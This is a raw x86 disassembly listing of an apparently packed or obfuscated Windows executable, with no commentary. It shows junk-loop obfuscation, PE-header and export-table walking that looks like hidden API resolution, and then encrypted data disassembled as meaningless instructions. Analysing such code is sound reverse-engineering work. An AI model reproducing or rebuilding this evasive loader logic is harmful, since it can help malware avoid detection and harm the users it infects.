  4089b0:	xor    esi,0x0
  4089b3:	cmp    edx,0x70941fd1
  4089b9:	jne    0x408a32
  4089bf:	cmp    esi,0xffffffff
  4089c2:	jne    0x408a32
  4089c8:	mov    edx,DWORD PTR ds:0x4219d6
  4089ce:	mov    esi,DWORD PTR ds:0x4219ce
  4089d4:	xor    edx,esi
  4089d6:	mov    DWORD PTR ds:0x4219ce,edx
  4089dc:	mov    edx,DWORD PTR [ebp+0xc]
  4089df:	mov    edx,DWORD PTR [edx]
  4089e1:	mov    edx,DWORD PTR [edx]
  4089e3:	mov    esi,DWORD PTR ds:0x4219ce
  4089e9:	add    DWORD PTR [edx],esi
  4089eb:	mov    esi,DWORD PTR [ebp+0x8]
  4089ee:	mov    edx,DWORD PTR ds:0x4219ce
  4089f4:	xor    esi,0x7510893
  4089fa:	add    esi,0x3272db
  408a00:	xor    ebx,ebx
  408a02:	add    esi,ecx
  408a04:	adc    ebx,0xffffffff
  408a07:	xor    edi,edi
  408a09:	xor    esi,eax
  408a0b:	xor    ebx,0x0
  408a0e:	add    edx,ecx
  408a10:	adc    edi,0xffffffff
  408a13:	xor    edx,eax
  408a15:	xor    edi,0x0
  408a18:	cmp    edx,esi
  408a1a:	jne    0x408a32
  408a20:	cmp    edi,ebx
  408a22:	jne    0x408a32
  408a28:	mov    eax,ds:0x4219ce
  408a2d:	mov    ds:0x4219d6,eax
  408a32:	pop    edi
  408a33:	pop    esi
  408a34:	pop    ebx
  408a35:	pop    ebp
  408a36:	ret    0x8
  408a39:	push   ebp
  408a3a:	mov    ebp,esp
  408a3c:	push   ecx
  408a3d:	mov    eax,ds:0x42179e
  408a42:	mov    eax,DWORD PTR [eax]
  408a44:	add    DWORD PTR ds:0x42901c,eax
  408a4a:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  408a51:	mov    eax,DWORD PTR [ebp+0x8]
  408a54:	adc    DWORD PTR ds:0x42a010,0x6bac
  408a5e:	mov    al,BYTE PTR [eax]
  408a60:	xor    DWORD PTR ds:0x42b018,0x428020
  408a6a:	add    al,0xd
  408a6c:	sbb    DWORD PTR ds:0x428004,0x428008
  408a76:	xor    al,0x6f
  408a78:	mov    DWORD PTR ds:0x428004,0x2e21
  408a82:	cmp    al,0x35
  408a84:	mov    DWORD PTR ds:0x42a00c,0x23cb
  408a8e:	jne    0x408b4b
  408a94:	and    DWORD PTR ds:0x428024,0x429014
  408a9e:	mov    eax,DWORD PTR [ebp+0x8]
  408aa1:	dec    edx
  408aa2:	mov    ecx,DWORD PTR [ebp+0x8]
  408aa5:	and    edx,DWORD PTR ds:0x42b010
  408aab:	add    ecx,DWORD PTR [eax+0x3c]
  408aae:	mov    edx,0x7510893
  408ab3:	mov    DWORD PTR [ebp+0x8],ecx
  408ab6:	and    DWORD PTR ds:0x42c008,0x0
  408ac0:	jmp    0x408ad2
  408ac5:	mov    ecx,DWORD PTR ds:0x42c008
  408acb:	inc    ecx
  408acc:	mov    DWORD PTR ds:0x42c008,ecx
  408ad2:	cmp    DWORD PTR ds:0x42c008,0x18
  408ad9:	jae    0x408b1d
  408adf:	cmp    DWORD PTR ds:0x42c008,0x9
  408ae6:	jne    0x408afc
  408aec:	push   0x429014
  408af1:	push   0x5ace
  408af6:	call   DWORD PTR ds:0x42403c
  408afc:	cmp    DWORD PTR ds:0x42c008,0x8
  408b03:	jne    0x408b18
  408b09:	xor    ecx,ecx
  408b0b:	or     ecx,DWORD PTR ds:0x42c008
  408b11:	inc    ecx
  408b12:	mov    DWORD PTR ds:0x42c008,ecx
  408b18:	jmp    0x408ac5
  408b1d:	mov    eax,DWORD PTR [ebp-0x4]
  408b20:	xor    eax,edx
  408b22:	push   esi
  408b23:	mov    esi,DWORD PTR [ebp+0x8]
  408b26:	mov    ecx,0x3272db
  408b2b:	add    eax,ecx
  408b2d:	cmp    DWORD PTR [esi+0x54],eax
  408b30:	pop    esi
  408b31:	je     0x408b3f
  408b37:	mov    eax,DWORD PTR [ebp+0x8]
  408b3a:	jmp    0x408b58
  408b3f:	mov    eax,DWORD PTR [ebp-0x4]
  408b42:	xor    eax,edx
  408b44:	add    eax,ecx
  408b46:	jmp    0x408b58
  408b4b:	mov    eax,DWORD PTR [ebp-0x4]
  408b4e:	xor    eax,0x7510893
  408b53:	add    eax,0x3272db
  408b58:	leave  
  408b59:	ret    0x4
  408b5c:	push   ebp
  408b5d:	mov    ebp,esp
  408b5f:	sub    esp,0x18
  408b62:	and    DWORD PTR ds:0x42901c,0x0
  408b6c:	jmp    0x408b7e
  408b71:	mov    edx,DWORD PTR ds:0x42901c
  408b77:	inc    edx
  408b78:	mov    DWORD PTR ds:0x42901c,edx
  408b7e:	cmp    DWORD PTR ds:0x42901c,0x1a
  408b85:	jae    0x408bb7
  408b8b:	cmp    DWORD PTR ds:0x42901c,0x22
  408b92:	jne    0x408ba8
  408b98:	push   0x8447
  408b9d:	push   0x423564
  408ba2:	call   DWORD PTR ds:0x424040
  408ba8:	jmp    0x408b71
  408bad:	adc    DWORD PTR ds:0x42b010,0x42b00c
  408bb7:	mov    DWORD PTR [ebp-0x10],0xf89f85b6
  408bbe:	mov    ecx,DWORD PTR ds:0x42176a
  408bc4:	mov    ecx,DWORD PTR [ecx]
  408bc6:	and    DWORD PTR ds:0x42c01c,ecx
  408bcc:	lea    eax,[ebp+0x14]
  408bcf:	mov    DWORD PTR [ebp-0x4],eax
  408bd2:	push   esi
  408bd3:	and    DWORD PTR ds:0x428018,0x0
  408bdd:	jmp    0x408bef
  408be2:	mov    esi,DWORD PTR ds:0x428018
  408be8:	inc    esi
  408be9:	mov    DWORD PTR ds:0x428018,esi
  408bef:	cmp    DWORD PTR ds:0x428018,0x1a
  408bf6:	jae    0x408cc4
  408bfc:	cmp    DWORD PTR ds:0x428018,0x28
  408c03:	jne    0x408c14
  408c09:	push   0x42357f
  408c0e:	call   DWORD PTR ds:0x424044
  408c14:	jmp    0x408be2
  408c19:	and    DWORD PTR ds:0x42c000,0x0
  408c23:	mov    edx,DWORD PTR ds:0x42c000
  408c29:	inc    edx
  408c2a:	mov    DWORD PTR ds:0x42c000,edx
  408c30:	cmp    DWORD PTR ds:0x42c000,0x20
  408c37:	jne    0x408c52
  408c3d:	push   0x1ea1
  408c42:	push   0x42b008
  408c47:	push   0x423642
  408c4c:	call   DWORD PTR ds:0x424048
  408c52:	cmp    DWORD PTR ds:0x42c000,0x11
  408c59:	jb     0x408c23
  408c5f:	and    DWORD PTR ds:0x42b004,0x0
  408c69:	mov    edx,DWORD PTR ds:0x42b004
  408c6f:	inc    edx
  408c70:	mov    DWORD PTR ds:0x42b004,edx
  408c76:	cmp    DWORD PTR ds:0x42b004,0xf
  408c7d:	jne    0x408c93
  408c83:	push   0x428004
  408c88:	push   0x7cc5
  408c8d:	call   DWORD PTR ds:0x424014
  408c93:	cmp    DWORD PTR ds:0x42b004,0xe
  408c9a:	jne    0x408cad
  408ca0:	mov    edx,DWORD PTR ds:0x42b004
  408ca6:	inc    edx
  408ca7:	mov    DWORD PTR ds:0x42b004,edx
  408cad:	cmp    DWORD PTR ds:0x42b004,0x1d
  408cb4:	jb     0x408c69
  408cba:	mov    DWORD PTR ds:0x428014,0x22a8
  408cc4:	mov    esi,0xf89c85b6
  408cc9:	and    DWORD PTR ds:0x428008,0x0
  408cd3:	mov    edx,DWORD PTR ds:0x428008
  408cd9:	inc    edx
  408cda:	mov    DWORD PTR ds:0x428008,edx
  408ce0:	cmp    DWORD PTR ds:0x428008,0x19
  408ce7:	jne    0x408d17
  408ced:	push   0x62e7
  408cf2:	push   0x428000
  408cf7:	push   0x75f3
  408cfc:	push   0x428000
  408d01:	push   DWORD PTR [ebp-0x24]
  408d04:	push   0x6458
  408d09:	push   DWORD PTR [ebp-0x14]
  408d0c:	push   0x5743
  408d11:	call   DWORD PTR ds:0x424018
  408d17:	cmp    DWORD PTR ds:0x428008,0x14
  408d1e:	jb     0x408cd3
  408d24:	xor    ecx,ecx
  408d26:	add    ecx,DWORD PTR ds:0x429008
  408d2c:	adc    DWORD PTR ds:0x42c00c,ecx
  408d32:	mov    DWORD PTR [ebp-0xc],esi
  408d35:	lea    eax,[ebp-0xc]
  408d38:	dec    ecx
  408d39:	mov    DWORD PTR [ebp-0x14],eax
  408d3c:	mov    eax,DWORD PTR [ebp-0xc]
  408d3f:	adc    ecx,0x29e6
  408d45:	mov    edx,DWORD PTR [ebp-0x14]
  408d48:	and    DWORD PTR ds:0x428018,0x0
  408d52:	mov    ecx,DWORD PTR ds:0x428018
  408d58:	inc    ecx
  408d59:	mov    DWORD PTR ds:0x428018,ecx
  408d5f:	cmp    DWORD PTR ds:0x428018,0xb
  408d66:	jne    0x408d77
  408d6c:	push   0x4faf
  408d71:	call   DWORD PTR ds:0x42401c
  408d77:	cmp    DWORD PTR ds:0x428018,0xa
  408d7e:	jne    0x408d91
  408d84:	mov    ecx,DWORD PTR ds:0x428018
  408d8a:	inc    ecx
  408d8b:	mov    DWORD PTR ds:0x428018,ecx
  408d91:	cmp    DWORD PTR ds:0x428018,0x1e
  408d98:	jb     0x408d52
  408d9e:	inc    ecx
  408d9f:	mov    ecx,0x7510893
  408da4:	neg    DWORD PTR ds:0x42a004
  408daa:	xor    eax,ecx
  408dac:	add    eax,0x3272db
  408db1:	and    DWORD PTR ds:0x42c010,0x2759
  408dbb:	mov    DWORD PTR [edx],eax
  408dbd:	mov    edx,DWORD PTR ds:0x421762
  408dc3:	mov    eax,ds:0x421772
  408dc8:	sub    edx,eax
  408dca:	and    edx,DWORD PTR [edx+eax*1]
  408dcd:	mov    eax,ds:0x4217ca
  408dd2:	inc    DWORD PTR ds:0x42a01c
  408dd8:	mov    edx,DWORD PTR [ebp-0x4]
  408ddb:	and    DWORD PTR ds:0x42a018,0x7b9c
  408de5:	mov    eax,DWORD PTR [eax]
  408de7:	and    DWORD PTR ds:0x42c000,0x5f81
  408df1:	add    eax,DWORD PTR [edx]
  408df3:	movzx  edx,BYTE PTR ds:0x42a014
  408dfa:	or     DWORD PTR ds:0x42a01c,edx
  408e00:	push   edi
  408e01:	add    DWORD PTR ds:0x42a004,edx
  408e07:	mov    DWORD PTR [ebp-0x8],eax
  408e0a:	movzx  edx,WORD PTR ds:0x428004
  408e11:	sbb    DWORD PTR ds:0x42a01c,edx
  408e17:	mov    edi,DWORD PTR [ebp+0x8]
  408e1a:	and    DWORD PTR ds:0x42b01c,0x631e
  408e24:	mov    eax,ds:0x421952
  408e29:	mov    eax,DWORD PTR [eax+0x198]
  408e2f:	xor    edi,ecx
  408e31:	mov    DWORD PTR ds:0x428018,0x14
  408e3b:	cmp    DWORD PTR ds:0x428018,0x0
  408e42:	je     0x408e95
  408e48:	cmp    DWORD PTR ds:0x428018,0x3
  408e4f:	jne    0x408e63
  408e55:	push   DWORD PTR [ebp-0x28]
  408e58:	push   0x77dc
  408e5d:	call   DWORD PTR ds:0x424020
  408e63:	cmp    DWORD PTR ds:0x428018,0x4
  408e6a:	jne    0x408e7d
  408e70:	mov    edx,DWORD PTR ds:0x428018
  408e76:	dec    edx
  408e77:	mov    DWORD PTR ds:0x428018,edx
  408e7d:	mov    edx,DWORD PTR ds:0x428018
  408e83:	dec    edx
  408e84:	mov    DWORD PTR ds:0x428018,edx
  408e8a:	jmp    0x408e3b
  408e8f:	and    DWORD PTR ds:0x42c014,ecx
  408e95:	mov    edx,0x3272db
  408e9a:	sbb    DWORD PTR ds:0x429008,0x451c
  408ea4:	add    edi,edx
  408ea6:	mov    DWORD PTR ds:0x42a000,0x2432
  408eb0:	cmp    DWORD PTR [eax],edi
  408eb2:	je     0x408ebf
  408eb8:	mov    eax,DWORD PTR [eax]
  408eba:	jmp    0x409144
  408ebf:	mov    eax,DWORD PTR [ebp+0x18]
  408ec2:	cmp    eax,esi
  408ec4:	jne    0x408ede
  408eca:	mov    DWORD PTR ds:0x42a01c,0x2296
  408ed4:	push   0xf89c85b5
  408ed9:	jmp    0x409133
  408ede:	mov    esi,DWORD PTR [ebp+0x18]
  408ee1:	mov    eax,0x2f4e
  408ee6:	mov    eax,0xf89c85b4
  408eeb:	cmp    esi,eax
  408eed:	jne    0x409123
  408ef3:	sbb    esi,esi
  408ef5:	mov    eax,DWORD PTR [ebp+0x10]
  408ef8:	mov    esi,DWORD PTR ds:0x42c008
  408efe:	sbb    esi,DWORD PTR ds:0x42a008
  408f04:	mov    DWORD PTR ds:0x42c008,esi
  408f0a:	xor    eax,ecx
  408f0c:	mov    DWORD PTR ds:0x428000,0x1b
  408f16:	cmp    DWORD PTR ds:0x428000,0x0
  408f1d:	je     0x408f86
  408f23:	cmp    DWORD PTR ds:0x428000,0x4
  408f2a:	jne    0x408f5a
  408f30:	push   0x42a000
  408f35:	push   0x8ffd
  408f3a:	push   DWORD PTR [ebp-0x14]
  408f3d:	push   0x428014
  408f42:	push   0x2d9f
  408f47:	push   0x4236bc
  408f4c:	push   0x4cf3
  408f51:	push   DWORD PTR [ebp-0x1c]
  408f54:	call   DWORD PTR ds:0x424024
  408f5a:	cmp    DWORD PTR ds:0x428000,0x5
  408f61:	jne    0x408f74
  408f67:	mov    esi,DWORD PTR ds:0x428000
  408f6d:	dec    esi
  408f6e:	mov    DWORD PTR ds:0x428000,esi
  408f74:	mov    esi,DWORD PTR ds:0x428000
  408f7a:	dec    esi
  408f7b:	mov    DWORD PTR ds:0x428000,esi
  408f81:	jmp    0x408f16
  408f86:	add    eax,edx
  408f88:	mov    DWORD PTR [ebp-0x18],eax
  408f8b:	mov    eax,DWORD PTR [ebp+0xc]
  408f8e:	mov    esi,DWORD PTR [ebp-0x8]
  408f91:	xor    eax,ecx
  408f93:	add    eax,edx
  408f95:	imul   eax,DWORD PTR [esi]
  408f98:	mov    esi,DWORD PTR [ebp+0x8]
  408f9b:	xor    esi,ecx
  408f9d:	add    esi,edx
  408f9f:	cmp    esi,eax
  408fa1:	mov    eax,DWORD PTR [ebp-0x4]
  408fa4:	push   ebx
  408fa5:	je     0x408fc4
  408fab:	mov    esi,DWORD PTR [ebp-0x18]
  408fae:	add    DWORD PTR [eax],esi
  408fb0:	mov    eax,DWORD PTR [ebp-0x4]
  408fb3:	mov    esi,DWORD PTR [ebp+0xc]
  408fb6:	xor    esi,ecx
  408fb8:	add    esi,edx
  408fba:	imul   esi,DWORD PTR [eax]
  408fbd:	mov    DWORD PTR [eax],esi
  408fbf:	jmp    0x408fc9
  408fc4:	mov    esi,DWORD PTR [ebp+0x14]
  408fc7:	xor    DWORD PTR [eax],esi
  408fc9:	mov    eax,DWORD PTR [ebp-0x4]
  408fcc:	mov    edi,DWORD PTR [ebp+0x10]
  408fcf:	xor    edi,ecx
  408fd1:	mov    esi,0xffcd8d25
  408fd6:	mov    ebx,esi
  408fd8:	sub    ebx,edi
  408fda:	add    DWORD PTR [eax],ebx
  408fdc:	mov    eax,DWORD PTR [ebp-0x4]
  408fdf:	mov    edi,DWORD PTR [ebp-0x8]
  408fe2:	add    edi,DWORD PTR [eax]
  408fe4:	mov    DWORD PTR [ebp-0x8],edi
  408fe7:	mov    eax,DWORD PTR [ebp+0xc]
  408fea:	mov    edi,DWORD PTR [ebp+0xc]
  408fed:	xor    edi,ecx
  408fef:	xor    eax,ecx
  408ff1:	lea    eax,[eax+edi*1+0x64e5b6]
  408ff8:	mov    edi,DWORD PTR [ebp+0xc]
  408ffb:	xor    edi,ecx
  408ffd:	add    edi,edx
  408fff:	imul   eax,edi
  409002:	mov    edi,DWORD PTR [ebp+0xc]
  409005:	xor    edi,ecx
  409007:	sub    edi,eax
  409009:	mov    eax,DWORD PTR [ebp-0x4]
  40900c:	add    edi,edx
  40900e:	cmp    DWORD PTR [eax],edi
  409010:	mov    eax,DWORD PTR [ebp-0x4]
  409013:	mov    edi,DWORD PTR [ebp+0x10]
  409016:	jg     0x409029
  40901c:	xor    edi,ecx
  40901e:	mov    ebx,esi
  409020:	sub    ebx,edi
  409022:	add    DWORD PTR [eax],ebx
  409024:	jmp    0x40902f
  409029:	xor    edi,ecx
  40902b:	add    edi,edx
  40902d:	add    DWORD PTR [eax],edi
  40902f:	mov    eax,DWORD PTR [ebp-0x8]
  409032:	mov    edi,DWORD PTR [ebp-0x10]
  409035:	mov    eax,DWORD PTR [eax]
  409037:	xor    edi,ecx
  409039:	add    edi,0x3272da
  40903f:	not    edi
  409041:	and    eax,edi
  409043:	movsx  di,BYTE PTR [eax+0x1]
  409048:	mov    ebx,0x3b4b
  40904d:	sub    di,bx
  409050:	mov    ebx,0x8a85
  409055:	xor    di,bx
  409058:	mov    ebx,0x4f8a
  40905d:	cmp    di,bx
  409060:	jne    0x409088
  409066:	movsx  di,BYTE PTR [eax]
  40906a:	mov    ebx,0x3b4b
  40906f:	sub    di,bx
  409072:	mov    ebx,0x8a85
  409077:	xor    di,bx
  40907a:	mov    ebx,0x4f87
  40907f:	cmp    di,bx
  409082:	je     0x409098
  409088:	mov    edi,DWORD PTR [ebp-0x10]
  40908b:	xor    edi,ecx
  40908d:	mov    ebx,esi
  40908f:	sub    ebx,edi
  409091:	add    eax,ebx
  409093:	jmp    0x409043
  409098:	mov    esi,DWORD PTR [ebp-0x14]
  40909b:	mov    esi,DWORD PTR [esi]
  40909d:	mov    edi,DWORD PTR [eax+0x3c]
  4090a0:	lea    esi,[edi+esi*8+0x78]
  4090a4:	mov    esi,DWORD PTR [esi+eax*1]
  4090a7:	mov    DWORD PTR [ebp-0x8],esi
  4090aa:	mov    esi,DWORD PTR [ebp+0x8]
  4090ad:	xor    esi,ecx
  4090af:	add    esi,edx
  4090b1:	mov    DWORD PTR [ebp-0x14],esi
  4090b4:	mov    esi,DWORD PTR [ebp+0x8]
  4090b7:	mov    edi,DWORD PTR [ebp-0x8]
  4090ba:	xor    esi,ecx
  4090bc:	add    esi,edx
  4090be:	pop    ebx
  4090bf:	cmp    edi,esi
  4090c1:	jne    0x4090df
  4090c7:	mov    eax,DWORD PTR [ebp+0xc]
  4090ca:	xor    eax,ecx
  4090cc:	mov    ecx,DWORD PTR [ebp-0x8]
  4090cf:	add    eax,edx
  4090d1:	imul   eax,ecx
  4090d4:	mov    DWORD PTR [ebp-0x8],eax
  4090d7:	push   DWORD PTR [ebp+0x18]
  4090da:	jmp    0x409133
  4090df:	mov    ecx,DWORD PTR [ebp-0x8]
  4090e2:	add    ecx,eax
  4090e4:	mov    DWORD PTR [ebp-0x14],ecx
  4090e7:	mov    ecx,DWORD PTR [ebp-0x14]
  4090ea:	mov    ecx,DWORD PTR [ecx+0xc]
  4090ed:	movsx  cx,BYTE PTR [ecx+eax*1]
  4090f2:	mov    edx,0x3b4b
  4090f7:	sub    cx,dx
  4090fa:	mov    edx,0x8a85
  4090ff:	xor    cx,dx
  409102:	mov    edx,0x4f85
  409107:	cmp    cx,dx
  40910a:	jne    0x4090d7
  409110:	mov    ecx,DWORD PTR ds:0x421952
  409116:	mov    ecx,DWORD PTR [ecx+0x198]
  40911c:	mov    DWORD PTR [ecx],eax
  40911e:	jmp    0x409144
  409123:	mov    ecx,DWORD PTR [ebp+0x18]
  409126:	cmp    ecx,0xf89c85b5
  40912c:	jne    0x409144
  409132:	push   eax
  409133:	push   DWORD PTR [ebp+0x14]
  409136:	push   DWORD PTR [ebp+0x10]
  409139:	push   DWORD PTR [ebp+0xc]
  40913c:	push   DWORD PTR [ebp+0x8]
  40913f:	call   0x408b5c
  409144:	pop    edi
  409145:	pop    esi
  409146:	leave  
  409147:	ret    0x14
  40914a:	push   ebp
  40914b:	mov    ebp,esp
  40914d:	push   ecx
  40914e:	mov    DWORD PTR [ebp-0x4],0xf89c85ba
  409155:	mov    eax,DWORD PTR [ebp-0x4]
  409158:	mov    ecx,DWORD PTR ds:0x42b010
  40915e:	sbb    DWORD PTR ds:0x42a018,ecx
  409164:	mov    edx,DWORD PTR [ebp+0x10]
  409167:	mov    DWORD PTR ds:0x42801c,0x4950
  409171:	mov    ecx,0x7510893
  409176:	sbb    DWORD PTR ds:0x428028,0x4a48
  409180:	xor    eax,ecx
  409182:	add    DWORD PTR ds:0x42b000,0x42800c
  40918c:	add    eax,0x3272db
  409191:	mov    DWORD PTR ds:0x42a014,0x169
  40919b:	mov    DWORD PTR [edx],eax
  40919d:	sbb    eax,edx
  40919f:	mov    eax,DWORD PTR [ebp+0xc]
  4091a2:	xor    eax,ecx
  4091a4:	inc    edx
  4091a5:	push   esi
  4091a6:	xor    esi,edx
  4091a8:	mov    esi,DWORD PTR [ebp+0x10]
  4091ab:	mov    edx,0x3272db
  4091b0:	add    eax,edx
  4091b2:	add    DWORD PTR ds:0x42b01c,0x428020
  4091bc:	mov    DWORD PTR [esi+0x4],eax
  4091bf:	mov    eax,DWORD PTR [ebp+0x14]
  4091c2:	mov    esi,DWORD PTR ds:0x428024
  4091c8:	sbb    esi,DWORD PTR ds:0x429010
  4091ce:	mov    DWORD PTR ds:0x428024,esi
  4091d4:	mov    esi,DWORD PTR [ebp+0x10]
  4091d7:	mov    DWORD PTR [esi+0x8],eax
  4091da:	mov    eax,DWORD PTR [ebp+0x18]
  4091dd:	mov    esi,DWORD PTR [ebp+0x10]
  4091e0:	mov    DWORD PTR [esi+0xc],eax
  4091e3:	mov    eax,DWORD PTR [ebp+0x1c]
  4091e6:	mov    esi,DWORD PTR [ebp+0x10]
  4091e9:	mov    DWORD PTR [esi+0x10],eax
  4091ec:	mov    eax,DWORD PTR [ebp+0x8]
  4091ef:	xor    eax,ecx
  4091f1:	add    eax,edx
  4091f3:	pop    esi
  4091f4:	leave  
  4091f5:	ret    0x18
  4091f8:	push   ebp
  4091f9:	mov    ebp,esp
  4091fb:	sub    esp,0x94
  409201:	mov    eax,DWORD PTR [ebp+0x8]
  409204:	push   ebx
  409205:	neg    ecx
  409207:	jmp    0x40b57c
  40920c:	mov    dl,0xcf
  40920e:	enter  0x872f,0x27
  409212:	imul   ebp,DWORD PTR [edi+0x65],0xfad7ebdc
  409219:	fdiv   QWORD PTR [ecx-0x2c]
  40921c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40921d:	sbb    BYTE PTR [edx+0x62],ah
  409220:	or     bl,BYTE PTR [edi+0x62]
  409223:	bound  ecx,QWORD PTR [ebx]
  409225:	ss push esp
  409227:	mov    DWORD PTR [edi],esi
  409229:	xor    al,0x31
  40922b:	sub    cl,BYTE PTR [esi]
  40922d:	mov    ds:0x94d2ea78,eax
  409232:	push   es
  409233:	imul   eax,DWORD PTR [esi+eiz*2-0x4],0xffffffdc
  409238:	push   esp
  409239:	ins    BYTE PTR es:[edi],dx
  40923a:	push   ebx
  40923b:	jg     0x409280
  40923d:	call   0x3629:0x3fcc4007
  409244:	popa   
  409245:	sbb    al,0xe5
  409247:	pop    ss
  409248:	out    0x5d,eax
  40924a:	xlat   BYTE PTR ds:[ebx]
  40924b:	jae    0x40925b
  40924d:	xchg   esp,eax
  40924e:	jle    0x409264
  409250:	push   cs
  409251:	(bad)  
  409252:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409253:	js     0x409273
  409255:	es jl  0x409284
  409258:	add    dh,BYTE PTR [ebx-0x59]
  40925b:	mov    bh,0x38
  40925d:	add    eax,0x9a38dc9
  409262:	std    
  409263:	ss pop esi
  409265:	xchg   BYTE PTR ds:0x4adf3e2,cl
  40926b:	lds    ebp,FWORD PTR [edx+esi*8]
  40926e:	ret    
  40926f:	and    edi,esi
  409271:	scas   eax,DWORD PTR es:[edi]
  409272:	rcr    esp,cl
  409274:	out    dx,al
  409275:	mov    esp,0xf3775ccb
  40927a:	adc    DWORD PTR [eax+0x56b79f7a],edi
  409280:	jbe    0x4092c4
  409282:	sbb    edi,edx
  409284:	or     al,0xa8
  409286:	es bnd jge 0x4092df
  40928a:	adc    dl,BYTE PTR [ecx]
  40928c:	xor    ecx,DWORD PTR [eax+edx*2-0x3c]
  409290:	js     0x40929e
  409292:	(bad)  
  409293:	xor    DWORD PTR ds:0x77e3a4f,edx
  409299:	sbb    BYTE PTR [ecx+eax*1+0x135eda0],ch
  4092a0:	dec    esi
  4092a1:	add    BYTE PTR [ecx-0x2b1c9828],dl
  4092a7:	sbb    BYTE PTR [eax],0x2a
  4092aa:	clc    
  4092ab:	(bad)  
  4092ac:	int    0xbf
  4092ae:	test   al,0x11
  4092b0:	mov    bh,0xe
  4092b2:	loope  0x4092fd
  4092b4:	call   0x8cac:0xe784ffc1
  4092bb:	jge    0x4092fe
  4092bd:	xchg   ecx,eax
  4092be:	in     al,dx
  4092bf:	fwait
  4092c0:	mov    al,0xdf
  4092c2:	cwde   
  4092c3:	push   cs
  4092c4:	push   es
  4092c5:	push   es
  4092c6:	xor    DWORD PTR [ecx-0x777440cc],esp
  4092cc:	mov    ecx,0x9062e6c0
  4092d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4092d2:	in     al,0x2f
  4092d4:	inc    ecx
  4092d5:	jns    0x4092fd
  4092d7:	xchg   ebx,eax
  4092d8:	mov    al,ds:0xf6f30afd
  4092dd:	xchg   esi,eax
  4092de:	or     bh,0xf4
  4092e1:	repnz inc ecx
  4092e3:	(bad)  
  4092e4:	aam    0x3c
  4092e6:	shr    dh,0x5b
  4092e9:	je     0x409337
  4092eb:	test   al,0x12
  4092ed:	adc    eax,esi
  4092ef:	adc    al,0xf3
  4092f1:	add    bl,0xb9
  4092f4:	fcmovb st,st(7)
  4092f6:	jns    0x4092ab
  4092f8:	xor    al,bh
  4092fa:	xor    eax,0x64805556
  4092ff:	cmp    al,0x21
  409301:	icebp  
  409302:	popf   
  409303:	mov    ah,0x90
  409305:	ss xor eax,0x11647666
  40930b:	cmc    
  40930c:	xlat   BYTE PTR ds:[ebx]
  40930d:	push   cs
  40930e:	adc    DWORD PTR [ecx-0x6e78667f],eax
  409314:	call   0xd7df:0xb63b5c36
  40931b:	add    edx,DWORD PTR [esi]
  40931d:	sar    DWORD PTR [ebx+0x55],cl
  409320:	shl    BYTE PTR [ebx+esi*1-0x7d],0x39
  409325:	cli    
  409326:	sub    al,bh
  409328:	stos   DWORD PTR es:[edi],eax
  409329:	xchg   esp,eax
  40932a:	je     0x409340
  40932c:	repz or DWORD PTR [ebx+0xa062409],esi
  409333:	push   esp
  409334:	xor    ch,al
  409336:	adc    al,BYTE PTR ds:0x5f362372
  40933c:	push   ebp
  40933d:	popa   
  40933e:	mov    ds:0x5064984c,eax
  409343:	cdq    
  409344:	mov    BYTE PTR [eax+0x44983db1],bh
  40934a:	ins    DWORD PTR es:[edi],dx
  40934b:	mov    WORD PTR [ecx-0x43],?
  40934e:	je     0x409334
  409350:	mov    eax,ds:0xc3ca735b
  409355:	xchg   ebx,eax
  409356:	push   ecx
  409357:	jmp    0x27fe:0xf48eca4c
  40935e:	cdq    
  40935f:	pushf  
  409360:	inc    esi
  409361:	inc    edi
  409362:	ins    BYTE PTR es:[edi],dx
  409363:	pop    ebp
  409364:	enter  0xf03c,0x29
  409368:	jmp    0x22d403d9
  40936d:	pop    eax
  40936e:	sub    al,0xe9
  409370:	cld    
  409371:	sbb    al,0x21
  409373:	inc    ebx
  409374:	xlat   BYTE PTR ds:[ebx]
  409375:	xor    ch,BYTE PTR [esi+0xa]
  409378:	cwde   
  409379:	jl     0x4093e7
  40937b:	mov    ch,0x6e
  40937d:	dec    ebp
  40937e:	out    dx,al
  40937f:	stos   BYTE PTR es:[edi],al
  409380:	xlat   BYTE PTR ds:[ebx]
  409381:	lock mov esp,esi
  409384:	adc    al,BYTE PTR [edi]
  409386:	jne    0x40930a
  409388:	cld    
  409389:	iret   
  40938a:	sbb    al,0x0
  40938c:	mov    ecx,0x6320d6f6
  409391:	scas   al,BYTE PTR es:[edi]
  409392:	push   ebx
  409393:	inc    ebx
  409394:	xlat   BYTE PTR ds:[ebx]
  409395:	pop    esp
  409396:	fcmovne st,st(5)
  409398:	push   ebp
  409399:	div    al
  40939b:	aas    
  40939c:	push   es
  40939d:	cmp    edi,0xc45059e2
  4093a3:	int    0x44
  4093a5:	and    eax,0x9c01dae5
  4093aa:	xor    al,0x95
  4093ac:	cmp    esp,esp
  4093ae:	push   0xffffffc8
  4093b0:	clc    
  4093b1:	sub    DWORD PTR [esi-0x2e363f0a],esp
  4093b7:	add    eax,0x52073029
  4093bc:	(bad)  
  4093bd:	ficom  WORD PTR [esi+0x3ac8878c]
  4093c3:	jle    0x4093fc
  4093c5:	xor    DWORD PTR [ebp-0x24],ebx
  4093c8:	jge    0x40934c
  4093ca:	nop
  4093cb:	shld   ebp,esi,cl
  4093ce:	mov    ch,cl
  4093d0:	adc    DWORD PTR [ebp+ebx*2+0x35],esi
  4093d4:	sbb    eax,0xca937fd3
  4093d9:	bound  esi,QWORD PTR [esi]
  4093db:	das    
  4093dc:	mov    ah,0x69
  4093de:	sub    BYTE PTR [esi],bl
  4093e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4093e1:	repz sub al,0xfe
  4093e4:	xchg   DWORD PTR [edi],eax
  4093e6:	xchg   esp,eax
  4093e7:	pop    ecx
  4093e8:	cs jnp 0x409391
  4093eb:	mov    ds:0x7eb1c97e,eax
  4093f0:	xor    DWORD PTR [edx-0x130cfeb7],eax
  4093f6:	inc    eax
  4093f7:	aaa    
  4093f8:	cmp    edi,DWORD PTR [esi+0x59c17208]
  4093fe:	sbb    eax,0x2181e386
  409403:	push   ss
  409404:	mov    WORD PTR [edi],es
  409406:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409407:	xor    DWORD PTR [eax-0xc2cfebe],0xffffffc5
  40940e:	push   ebx
  40940f:	ins    BYTE PTR es:[edi],dx
  409410:	in     eax,dx
  409411:	jnp    0x409402
  409413:	(bad)  [edx+0x5725d47b]
  409419:	fwait
